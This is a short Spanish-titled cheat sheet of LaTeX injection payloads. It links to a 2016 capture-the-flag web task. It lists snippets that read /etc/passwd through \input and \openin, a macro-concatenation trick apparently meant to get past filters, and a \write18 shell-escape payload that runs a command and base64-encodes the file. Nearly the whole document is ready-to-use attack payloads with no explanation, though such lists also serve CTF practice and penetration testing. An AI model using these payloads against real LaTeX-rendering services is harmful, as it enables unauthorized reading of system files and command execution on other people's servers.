# Inyecciones latex

[https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)

```
\input {/etc/passwd}
```

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

```
\def\first{ho}
\def\second{la}
\first\second
```

```
\immediate\write 18{cat /etc/passwd | base64 > output}
\input\output
```
